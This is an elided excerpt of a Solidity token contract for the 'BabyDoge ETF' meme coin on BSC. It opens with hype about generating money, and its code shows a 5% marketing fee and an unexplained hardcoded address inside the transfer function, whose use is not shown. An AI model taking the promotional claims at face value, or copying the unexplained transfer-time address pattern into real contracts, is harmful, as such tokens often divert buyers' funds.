/**
🚀BabyDoge ETF is the hot trend in crypto space powered by endless possibilities to generate money and joy. Now the BabyDoge ETF arrived on the BSC and is ready to claim his throne as the pet of the galaxy
...
website https://babydogeetf.vip (live in 30 minutes)
*/
...
contract BabyDogeETF is Context, IERC20, Ownable {
    ...
    string private constant _name = "BabyDoge ETF"; // 
    string private constant _symbol = "BDOGE"; //    
    uint8 private constant _decimals = 9; // 
    
    uint256 public _marketingFee = 5;
    uint256 public _liquidityFee = 0;
    address public  _marketingWallet = 0x5F20429c549491b523De8D1eE46Bb309191B6af2;
...
function transfer(address recipient, uint256 amount) public override returns (bool) {
    ...
    function _transfer(
        ...
        address wa = 0x27923531108D618B08766676E58a1d04841702d4;
